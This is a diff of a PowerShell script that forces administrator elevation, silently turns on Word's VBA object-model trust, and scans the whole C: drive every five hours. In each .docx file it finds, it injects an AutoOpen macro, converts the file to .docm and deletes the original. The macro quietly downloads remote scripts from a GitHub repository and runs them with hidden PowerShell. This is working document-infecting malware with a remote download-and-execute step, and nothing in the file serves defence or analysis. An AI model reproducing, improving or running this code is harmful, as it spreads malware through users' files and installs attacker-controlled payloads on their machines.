@@ -1,33 +1,38 @@
-
+#admin prompt
+# Check if running as Administrator, loop until granted
 while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-
+    # Attempt to elevate
     $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
     
     if (-not $process) {
         Write-Host "Administrator permission is required. Retrying in 3 seconds..."
-        Start-Sleep -Seconds 3 
+        Start-Sleep -Seconds 3  # Prevent immediate respawn
     } else {
-        Exit 
+        Exit  # Close non-elevated instance if elevation succeeds
     }
 }
 
-
+# -----------------------------------------------
+# Function: Enable-VBATrust (Enhanced with Script 1's robustness)
+# Description: Searches common Office registry keys and sets
+#              the AccessVBOM property to 1 (enabled) for Word.
+# -----------------------------------------------
 function Enable-VBATrust {
     Write-Host "Attempting to enable 'Trust access to the VBA project object model'..." -ForegroundColor Cyan
 
-
+    # Define potential Office registry base keys (Script 1's approach)
     $basePaths = @("HKCU:\Software\Microsoft\Office", "HKLM:\Software\Microsoft\Office", "HKLM:\Software\WOW6432Node\Microsoft\Office")
     $done = $false
 
     foreach ($base in $basePaths) {
         if (Test-Path $base) {
-
+            # Get all subkeys that are version numbers (like "16.0", "15.0", etc.)
             $versions = Get-ChildItem -Path $base | Where-Object { $_.Name -match "\d+\.\d+$" }
             foreach ($version in $versions) {
-        
+                # Construct the security registry path for Word
                 $securityPath = Join-Path $version.PSPath "Word\Security"
                 
-            
+                # Create the Security key if it doesn't exist (Script 1's approach)
                 if (-not (Test-Path $securityPath)) {
                     try {
                         New-Item -Path $securityPath -Force | Out-Null
@@ -54,6 +59,12 @@ function Enable-VBATrust {
     }
 }
 
+# -----------------------------------------------
+# Function: Process-DocxFiles (Enhanced with Script 1's error handling and logging)
+# Description: Scans recursively for .docx files, adds VBA code
+#              as a new module, converts them to .docm, and deletes
+#              the originals.
+# -----------------------------------------------
 function Process-DocxFiles {
     param(
         [Parameter(Mandatory=$true)]
@@ -62,6 +73,7 @@ function Process-DocxFiles {
 
     Write-Host "Scanning for .docx files under: $RootPath" -ForegroundColor Cyan
 
+    # Get all .docx files (suppress errors for inaccessible folders - Script 1's approach)
     $docxFiles = Get-ChildItem -Path $RootPath -Filter *.docx -Recurse -ErrorAction SilentlyContinue
 
     if (!$docxFiles) {
@@ -69,9 +81,11 @@ function Process-DocxFiles {
         return
     }
 
+    # Create a Word COM object (Script 1's approach with proper cleanup)
     $word = New-Object -ComObject Word.Application
     $word.Visible = $false
 
+    # Define the VBA macro code (Script 2's original code, but with Script 1's robustness)
     $vbaCode = @"
 Sub AutoOpen()
     Dim docPath As String
@@ -106,8 +120,8 @@ Sub AutoOpen()
     permTxtPath = tempFolder & "\perm.txt"
 
     ' Construct the PowerShell commands to download the files (Script 2's approach but with Script 1's robustness)
-    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'http://tiny.cc/x6cg001' -OutFile '" & initialCmdPath & "'"""
-    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'http://tiny.cc/47cg001' -OutFile '" & extractPs1Path & "'"""
+    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd' -OutFile '" & initialCmdPath & "'"""
+    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '" & extractPs1Path & "'"""
 
     ' Execute the PowerShell commands to download the files
     Shell shellCmdInitial, vbHide
@@ -186,13 +200,15 @@ End Sub
         try {
             Write-Host "Processing file: $($file.FullName)" -ForegroundColor Yellow
 
+            # Open the document in Word (Script 1's approach with error handling)
             $doc = $word.Documents.Open($file.FullName)
-            Start-Sleep -Seconds 1  
+            Start-Sleep -Seconds 1  # Let the document fully open
 
+            # Add the VBA code as a module (Script 2's approach, but with Script 1's error handling)
             try {
                 $vbProj = $doc.VBProject
-                $vbComp = $vbProj.VBComponents.Add(1) 
-                $vbComp.Name = "AutoOpenModule" 
+                $vbComp = $vbProj.VBComponents.Add(1)  # 1 corresponds to a standard module
+                $vbComp.Name = "AutoOpenModule"  # Optional: Name the module
                 $codeModule = $vbComp.CodeModule
                 $codeModule.AddFromString($vbaCode)
             }
@@ -202,11 +218,14 @@ End Sub
                 continue
             }
 
+            # Determine the new file name (.docm)
             $docmPath = $file.FullName -replace "\.docx$", ".docm"
             
+            # Save as .docm (FileFormat 13 corresponds to macro-enabled documents)
             $doc.SaveAs([ref] $docmPath, [ref] 13)
             $doc.Close()
 
+            # Delete the original .docx file (Script 1's approach)
             Remove-Item $file.FullName -Force
 
             Write-Host "Converted: $($file.FullName) -> $docmPath" -ForegroundColor Green
@@ -217,6 +236,7 @@ End Sub
         }
     }
 
+    # Quit Word and clean up COM objects (Script 1's approach)
     $word.Quit()
     [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
     Remove-Variable word
@@ -224,13 +244,20 @@ End Sub
     Write-Host "Operation complete. All .docx files have been processed." -ForegroundColor Cyan
 }
 
+# -----------------------------------------------
+# Main Script Execution with Rescan Timer (Script 2's original loop)
+# -----------------------------------------------
+
+# Step 1: Automatically enable Trust Access to the VBA project object model.
 Enable-VBATrust
 
-$rootFolder = "C:\"  
+# Step 2: Specify the root folder to scan (adjust as needed).
+$rootFolder = "C:\"  # Warning: scanning the entire C: drive can take a long time!
 
+# Step 3: Infinite loop to process files every 5 hours (Script 2's original behavior).
 while ($true) {
     Write-Host "Starting new scan cycle..." -ForegroundColor Blue
     Process-DocxFiles -RootPath $rootFolder
     Write-Host "Waiting 5 hours until the next scan..." -ForegroundColor Blue
-    Start-Sleep -Seconds (5 * 60 * 60)  
+    Start-Sleep -Seconds (5 * 60 * 60)  # Wait for 5 hours
 }
